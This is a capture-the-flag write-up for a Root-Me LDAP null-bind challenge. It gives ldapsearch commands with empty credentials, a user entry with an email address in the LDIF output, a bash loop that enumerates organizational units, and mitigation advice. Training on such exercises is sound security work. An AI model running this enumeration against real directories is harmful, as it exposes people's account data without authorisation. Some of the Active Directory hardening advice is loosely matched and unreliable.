# LDAP - null bind

`Network` • `Easy` • `15 pts`

## TL;DR

Exploit misconfigured LDAP server allowing unauthenticated access (null bind) to specific organizational units. Enumerate directory structure to find user with exposed email address.

**Flag:** `[REDACTED]`

---

## Challenge Description

> The administrator needs you; it seems that someone "anonymous" installed themselves somewhere in the LDAP directory tree:
> `dc=challenge01,dc=root-me,dc=org`
> 
> Retrieve access to their data and bring back their email address.

**Target:** `challenge01.root-me.org:54013`  
**Base DN:** `dc=challenge01,dc=root-me,dc=org`

---

## Recon

**LDAP (Lightweight Directory Access Protocol)** is used for accessing and maintaining distributed directory information services (e.g., Active Directory, OpenLDAP).

**Null bind** = LDAP authentication with an empty Distinguished Name (DN) and password, typically used for anonymous read access to public directory information.

**Vulnerability:** Server allows unauthenticated access to sensitive organizational units instead of properly restricting anonymous binds.

---

## Exploitation

### Method 1: Direct Base DN Query (Failed)
```bash
$ ldapsearch -x -H ldap://challenge01.root-me.org:54013 -b "dc=challenge01,dc=root-me,dc=org"

# Result: Insufficient access
```

The base DN is protected against null binds.

---

### Method 2: Enumerate Organizational Units

Since the challenge mentions "anonymous" installed "somewhere" in the tree, we enumerate common OUs:
```bash
# Test ou=anonymous
$ ldapsearch -x -H ldap://challenge01.root-me.org:54013 \
  -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" \
  -D "" -w ""

# extended LDIF
#
# LDAPv3
# base <ou=anonymous,dc=challenge01,dc=root-me,dc=org>

# anonymous, challenge01.root-me.org
dn: ou=anonymous,dc=challenge01,dc=root-me,dc=org
objectClass: organizationalUnit
ou: anonymous

# sabu, anonymous, challenge01.root-me.org
dn: uid=sabu,ou=anonymous,dc=challenge01,dc=root-me,dc=org
objectClass: inetOrgPerson
objectClass: shadowAccount
uid: sabu
sn: sabu
cn: sabu
givenName: sabu
mail: sabu@anonops.org

# numResponses: 3
# numEntries: 2
```

**Success!** The `ou=anonymous` branch is accessible via null bind.

**Email extracted:** `[REDACTED]`

---

### Method 3: Automated Enumeration Script
```bash
#!/bin/bash
# Test common organizational units
OUS=("anonymous" "users" "people" "guests" "admin" "public")
BASE="dc=challenge01,dc=root-me,dc=org"
HOST="ldap://challenge01.root-me.org:54013"

for ou in "${OUS[@]}"; do
    echo "[*] Testing ou=$ou..."
    ldapsearch -x -H "$HOST" -b "ou=$ou,$BASE" -D "" -w "" 2>&1 | \
        grep -q "numEntries: [1-9]" && echo "[+] Found data in ou=$ou"
done
```

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Impact |
|---------------|--------|
| **CWE-306** | Missing Authentication for Critical Function |
| **CVE-2020-8027** | OpenLDAP null bind disclosure |
| **MITRE ATT&CK T1087.002** | Domain Account enumeration |

**Information Disclosed via Null Bind:**
- **User accounts** (emails, names, phone numbers)
- **Organizational structure** (departments, groups)
- **System accounts** (service accounts, technical users)
- **Group memberships** (privilege escalation paths)

**Real-world consequences:**
- Phishing campaigns with valid employee emails
- Username enumeration for password attacks
- Social engineering with org chart knowledge
- Privilege escalation via group membership discovery

---

### Secure Configuration

**OpenLDAP (`/etc/ldap/slapd.conf`):**
```
# Disable anonymous binds
disallow bind_anon

# Or restrict anonymous access to specific attributes
access to *
    by anonymous auth
    by self write
    by * none
```

**Active Directory:**
- Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
- Set "Network access: Allow anonymous SID/Name translation" to **Disabled**
- Restrict anonymous LDAP binds via registry:
```
  HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
  LDAPServerIntegrity = 2 (require signature/seal)
```

**Best Practices:**
1. **Disable anonymous binds** unless absolutely necessary
2. **Implement ACLs** on sensitive OUs (HR, IT, Finance)
3. **Audit LDAP queries** (log anonymous bind attempts)
4. **Use LDAPS** (LDAP over TLS) on port 636
5. **Regular penetration testing** with tools like ldapsearch, ldapenum

---

## Key Takeaways

**Technical Skills:**
- Performed LDAP null bind authentication
- Enumerated directory structure (OUs, DNs)
- Analyzed LDAP object classes (organizationalUnit, inetOrgPerson)
- Extracted specific attributes (mail, uid, cn)

**Security Concepts:**
- Null binds expose directory information to unauthenticated users
- ACLs must be applied at **both** base DN and OU levels
- Default-allow configurations create security gaps
- LDAP enumeration is a critical reconnaissance technique

---

## References

- [RFC 4513 - LDAP Authentication Methods](https://datatracker.ietf.org/doc/html/rfc4513)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP: LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [OpenLDAP Admin Guide: Access Control](https://www.openldap.org/doc/admin24/access-control.html)